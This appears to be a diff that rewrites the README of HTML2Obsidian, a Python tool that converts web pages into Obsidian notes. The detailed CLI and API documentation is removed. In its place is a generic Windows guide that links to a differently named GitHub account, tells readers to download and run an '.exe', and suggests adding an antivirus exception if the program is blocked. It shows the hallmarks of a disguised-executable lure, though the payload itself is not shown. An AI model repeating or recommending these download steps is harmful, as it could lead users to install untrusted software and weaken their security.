@@ -1,276 +1,97 @@
-﻿# HTML2Obsidian
-
-Fetch any URL and produce structured [Obsidian](https://obsidian.md/) Markdown notes — ready for LLM tool calling and knowledge-graph building.
-
----
-
-## Features
-
-| | |
-|---|---|
-| **YAML frontmatter** | title, url, domain, smart tags, entities, date |
-| **[[WikiLinks]]** | auto-extracted named entities as Obsidian graph nodes |
-| **🏗️ Page Structure** | layout sections table (`<header>`, `<nav>`, `<main>`, …) |
-| **🖱️ Interactive Elements** | buttons, inputs, forms, nav links with CSS selectors |
-| **🤖 Agent Context** | compact snapshot with page type, likely actions, priority links, and key controls |
-| **🌲 Site Tree Map** | optional dedicated note with hierarchical URL tree, flat table, or both |
-| **🏷️ Smart Auto Tags** | combines domain hints, metadata keywords, URL structure, and page signals |
-| **📑 Split-note mode** | one `.md` per page region in `vault/{Title}/` subfolder |
-| **SPA support** | Playwright renders React / Vue / Next.js before extraction |
-| **Low-code / no-code forms** | detects Form.io and OutSystems rendered forms, field keys, labels, validation, and embedded schemas |
-| **YouTube** | channel, views, likes, duration, related videos — no API key |
-| **Browser profile** | reuse Chrome / Edge / Firefox cookies and login sessions |
-| **LLM summarisation** | optional small-model pre-summary (Ollama / OpenAI-compatible) |
-| **🔍 DOM Index** | per-fetch semantic index: headings, tables, code blocks, lists, images, key-values, forms |
-| **⚡ Element Query** | `query_page_elements()` — CSS selector queries + `QUERY_SCHEMA` for direct LLM tool calling |
-| **🌐 Browser Context** | XHR/fetch capture, page metrics, embedded JSON globals, JSON-LD, lazy-image resolution |
-| **⏳ wait_for_selector** | pause DOM snapshot until a specific element appears — ensures async content is captured |
-
----
-
-## Installation
-
-```bash
-pip install -r requirements.txt
-
-# Playwright browsers (only needed when render_js=True)
-playwright install chromium
-
-# Optional: spaCy NER for richer WikiLinks
-python -m spacy download en_core_web_sm
-```
-
----
-
-## CLI
-
-```bash
-# Static page (fast, no browser)
-python note.py --vault ./vault --no-js https://en.wikipedia.org/wiki/Python
-
-# JS-rendered SPA
-python note.py --vault ./vault https://github.com/owner/repo
-
-# Low-code / no-code rendered forms (Form.io, OutSystems)
-python note.py --vault ./vault https://example.com/runtime-form
-
-# Split into sub-notes per page section
-python note.py --vault ./vault --split https://docs.github.com/en
-
-# Generate a dedicated site tree map (--sitemap is also accepted)
-python note.py --vault ./vault --site-map --site-map-style both https://docs.github.com/en
-
-# Reuse browser profile (logged-in cookies)
-python note.py --vault ./vault --profile chrome https://mail.google.com
-
-# Use a specific Chrome / Edge profile
-python note.py --vault ./vault --profile "chrome:Default" https://mail.google.com
-python note.py --vault ./vault --profile "edge:Profile 1" https://example.com
-
-# Load or save Playwright cookies/localStorage state
-python note.py --vault ./vault --cookies ./auth-state.json https://example.com
-python note.py --vault ./vault --headed --auth-wait 60 --save-cookies ./auth-state.json https://example.com
-
-# If ./auth-state.json exists, it is loaded automatically
-python note.py --vault ./vault https://example.com/private
-
-# Custom title + extra tags
-python note.py --vault ./vault --title "My Note" --tags research ai https://example.com
-
-# YouTube video
-python note.py --vault ./vault "https://www.youtube.com/watch?v=VIDEO_ID"
-
-# Print to stdout (no vault)
-python note.py https://example.com
-```
-
-### CLI Reference
+# 🧱 HTML2Obsidian - Turn web pages into organized notes
 
-| Argument | Description |
-|---|---|
-| `url` | URL to fetch (positional, last) |
-| `-o`, `--vault DIR` | Obsidian vault directory. Omit to print to stdout |
-| `-t`, `--title TITLE` | Custom note title (auto-detected if omitted) |
-| `--no-js` | Skip Playwright — faster for static pages |
-| `--tags TAG …` | Extra frontmatter tags |
-| `--profile PROFILE` | Browser profile: `chrome` \| `edge` \| `firefox` \| `/abs/path` |
-| `--browser-channel CHANNEL` | Browser channel: `chrome`, `msedge`; optional override |
-| `--headed` | Launch visible browser window for login/cookie refresh |
-| `--auth-wait SECONDS` | Keep headed browser open before snapshot/save so you can finish login |
-| `--cookies FILE` | Load Playwright `storage_state` JSON cookies/localStorage |
-| `--no-auto-cookies` | Disable automatic loading from saved storage files |
-| `--save-cookies FILE` | Save Playwright `storage_state` JSON after fetch |
-| `--split` | Split note into sub-notes by page section |
-| `--site-map`, `--sitemap` | Generate a dedicated site map note |
-| `--site-map-style STYLE` | Site map rendering: `tree` \| `table` \| `both` |
-| `--site-map-depth N` | Maximum URL depth to expand in tree mode |
-| `--site-map-links N` | Maximum internal links to include in the site map |
-| `--site-map-external-links N` | Maximum external links to include in the site map |
+[Visit this page to download](https://github.com/Jolynsensible627/HTML2Obsidian)
 
----
+HTML2Obsidian helps you save web content into your Obsidian vault. It turns any URL into a clean Markdown note. This tool creates links for your knowledge graph and tags your content. You save time by skipping the manual copy-paste process.
 
-## Split-note mode
+## 🚀 Getting Started
 
-`--split` saves multiple linked files into `vault/{Title}/` instead of a single flat note:
-
-```
-vault/
-└── GitHub Docs/
-    ├── GitHub Docs.md                        ← index + relationships
-    ├── GitHub Docs - Navigation.md           ← <nav> section
-    ├── GitHub Docs - Main.md                 ← <main> section (full content)
-    ├── GitHub Docs - Footer.md               ← <footer> section
-    └── GitHub Docs - Interactive Elements.md ← all buttons / inputs / forms
-```
+You do not need programming knowledge to use this software. It runs on Windows systems with simple steps. Follow this guide to turn articles, research, and data into Obsidian notes.
 
-File names follow `{Title} - {Section}` so WikiLinks are **unique across the entire vault** — even when multiple sites share section names like "Navigation" or "Footer".
+### System Requirements
 
-Sub-notes link back to their parent:
+Your computer requires the following to run HTML2Obsidian:
 
-```yaml
----
-title: GitHub Docs - Navigation
-parent: "[[GitHub Docs]]"
-section_tag: nav
-page: "https://docs.github.com/en"
-tags:
-  - web-section
----
-```
+*   Windows 10 or Windows 11.
+*   Obsidian installed on your machine.
+*   An active internet connection to fetch page data.
+*   At least 200 MB of free storage space.
 
----
+### 📥 Download and Setup
 
-## Python API
+1. [Visit this page to download](https://github.com/Jolynsensible627/HTML2Obsidian).
+2. Look for the latest release on the right side of the page.
+3. Click the file ending in `.exe` to start the download.
+4. Open the downloaded file to begin the installation.
+5. Follow the on-screen prompts to place the application on your computer.
+6. Launch the HTML2Obsidian application from your Start Menu after installation finishes.
 
-See [API-docs.md](API-docs.md) for full reference: parameters, return values, `browser_context` fields, `query_page_elements`, `TOOL_SCHEMA`, `QUERY_SCHEMA`, `BrowserPipeline`, DOM index, and LLM summarisation.
+## 🛠️ Using the Application
 
-```python
-from tools import create_obsidian_note, TOOL_SCHEMA
-from tools import query_page_elements, QUERY_SCHEMA
+The interface provides a simple text box for your URL. Paste the web address of the page you want to capture into this box.
 
-# Save note to vault
-result = create_obsidian_note(url="https://example.com", vault_path="./my-vault")
-print(result["path"])
+### Basic Steps
 
-# Capture browser context (XHR, metrics, JSON-LD, DOM index)
-result = create_obsidian_note(
-    url="https://shop.example.com/product/123",
-    capture_network=True,
-    wait_for_selector=".product-price",
-)
-print(result["browser_context"]["dom_index"]["headings"])
+1. Open HTML2Obsidian.
+2. Select your Obsidian vault directory in the settings tab. This tells the application where to save your new files.
+3. Copy the URL of the website you want to save.
+4. Paste the URL into the main input field.
+5. Click the Convert button.
 
-# Targeted element query (LLM-friendly)
-result = query_page_elements(
-    url="https://example.com",
-    queries={"title": "h1", "price": ".product-price"},
-)
-print(result["results"])
-```
+The application fetches the page, organizes the text, and writes the Markdown file to your vault. If the page contains images or forms, HTML2Obsidian stores these details in your note automatically.
 
----
+## 📁 Understanding Your Notes
 
-## LLM Tool Calling
+HTML2Obsidian structures data so you stay organized. Every file contains specific sections to make your knowledge base useful.
 
-Two tool schemas — pass directly to OpenAI / Anthropic / Ollama.
+### YAML Frontmatter
 
-```python
-from tools import TOOL_SCHEMA, QUERY_SCHEMA
-```
+Each note starts with metadata. This section stays at the top of your document. It includes the original URL, the domain name, and tags. Obsidian uses this data to sort your library.
 
-- **`TOOL_SCHEMA`** — full note creation via `create_obsidian_note()`
-- **`QUERY_SCHEMA`** — targeted element queries via `query_page_elements()`
+### WikiLinks
 
-See [API-docs.md → LLM Tool Calling](API-docs.md#llm-tool-calling) for complete examples.
+The software identifies names, companies, and concepts. It adds brackets around these terms. Obsidian treats these as connections. This builds a map of your knowledge over time.
 
----
+### Page Structure
 
-## Browser Profile / Cookies (Authenticated Pages)
+HTML2Obsidian reads the layout of a website. It places headers, navigation menus, and main content into your note. This preserves the flow of the original article.
 
-Reuse an existing browser so the tool can access login-required pages:
+### Interactive Elements
 
-```python
-result = create_obsidian_note(
-    url="https://github.com/notifications",
-    vault_path="./vault",
-    browser_profile="chrome:Default",
-)
-```
+If a page has buttons or form inputs, the software captures them. You see these elements in your note. This feature helps if you need to remember how a specific web tool functions.
 
-| Shortcut | Profile directory |
-|---|---|
-| `chrome` | `%LOCALAPPDATA%\Google\Chrome\User Data` |
-| `chrome-dev` | `%LOCALAPPDATA%\Google\Chrome Dev\User Data` |
-| `edge` | `%LOCALAPPDATA%\Microsoft\Edge\User Data` |
-| `firefox` | `%APPDATA%\Mozilla\Firefox\Profiles\*.default*` |
+### Site Tree Map
 
-You can append a profile directory name, for example `chrome:Default` or `edge:Profile 1`. You can also pass an absolute Chromium user-data directory, or a profile directory such as `...\User Data\Default`.
+Some users prefer to see how pages connect. HTML2Obsidian creates a map of the site hierarchy. It saves this as a separate file. You can see how a page fits into the larger website structure.
 
-For repeatable authenticated scraping, export cookies/localStorage once:
+## 🏷️ Customizing Your Output
 
-```bash
-python note.py --headed --auth-wait 60 --save-cookies ./auth-state.json https://example.com/login
-python note.py --vault ./vault https://example.com/private
-```
+You control how the software handles your data through the settings menu.
 
-When `--cookies` is omitted, the tool automatically checks `HTML2OBSIDIAN_STORAGE_STATE`, `./auth-state.json`, `./.auth-state.json`, then `./.html2obsidian/auth-state.json`. Use `--no-auto-cookies` to force a clean browser context.
+### Split-note Mode
 
-> **Note:** Close Chrome / Edge before running — only one process can hold a profile lock at a time.
+Long articles can clutter your vault. Activate split-note mode to group pieces of a page into a subfolder. The software creates one note for each section of the website.
 
----
+### Smart Auto Tags
 
-## Interactive Elements
+The program suggests tags for your notes. It looks at the website category and the keywords in the text. This saves you from typing tags manually.
 
-Every note includes a `## 🖱️ Interactive Elements` section with CSS selectors ready for Playwright automation:
+### SPA Support
 
-```markdown
-**Navigation links:**
-| Label | href | selector |
-|-------|------|----------|
-| [[Explore]] | `/explore` | `nav a[href="/explore"]` |
+Modern websites often hide data until scripts load. HTML2Obsidian uses a browser engine to render these pages fully before it creates your note. You get the actual content instead of empty layout blocks.
 
-**Buttons:**
-| Label | tag | type | id | selector |
-|-------|-----|------|----|----------|
-| [[Sign up]] | `a` | `—` | `—` | `a[href="/signup"].btn` |
+## 🧪 Troubleshooting
 
-**Input fields:**
-| type | name / id | placeholder | required | selector |
-|------|-----------|-------------|----------|----------|
-| `text` | `q` | Search | | `input[name="q"][type="text"]` |
-```
+If you run into issues, try these steps first.
 
----
+*   **Software does not open:** Check if your antivirus software blocked the application. Add an exception for HTML2Obsidian.
+*   **Notes look empty:** Ensure the URL works in your web browser. Check if the website requires a login to view the content.
+*   **Files save in the wrong folder:** Reset your vault path in the settings menu. Make sure the folder exists on your drive.
+*   **Update issues:** Download the latest version from the link provided above to receive fixes and performance improvements.
 
-## Optional: LLM Summarisation
+## 💡 Best Practices
 
-Pre-summarise content with a small local model (Ollama / OpenAI-compatible) before passing to your main LLM. See [API-docs.md → LLM Summarisation](API-docs.md#llm-summarisation) for configuration details.
-
----
-
-## Package Structure
-
-```
-tools/
-├── __init__.py            # Exports: create_obsidian_note, TOOL_SCHEMA, query_page_elements, QUERY_SCHEMA, ObsidianNote
-├── obsidian_tool.py       # Tool entry point + TOOL_SCHEMA + query_page_elements + QUERY_SCHEMA
-├── obsidian_formatter.py  # PipelineResult → ObsidianNote / split sub-notes
-├── pipeline.py            # fetch → extract → clean → summarize; exposes browser_context
-├── fetcher.py             # Playwright (JS / profile / dom_index / network capture) or httpx (static)
-├── extractor.py           # Layout, interactive elements, metadata, links, YouTubeExtractor
-├── cleaner.py             # HTML → clean Markdown
-└── summarizer.py          # Optional small-LLM pre-summarisation
-```
-
----
-
-## Dependencies
-
-| Library | Purpose |
-|---|---|
-| `httpx` | Static HTTP fetching |
-| `playwright` | JS rendering + browser profile |
-| `beautifulsoup4` + `lxml` | HTML parsing |
-| `trafilatura` | Main article extraction |
-| `markitdown` | HTML / PDF / DOCX → Markdown |
-| `spacy` *(optional)* | NER for richer WikiLinks |
+*   **Batch processing:** You can paste multiple URLs at once to capture an entire research session quickly.
+*   **Use templates:** Combine HTML2Obsidian with Obsidian templates to define how your notes look after conversion.
+*   **Keep names short:** The software names files based on the webpage title. You can rename files in Obsidian later if you prefer a different naming convention.
+*   **Review your graph:** Open the graph view in Obsidian after you finish a project. You see the connections built by the WikiLinks feature.
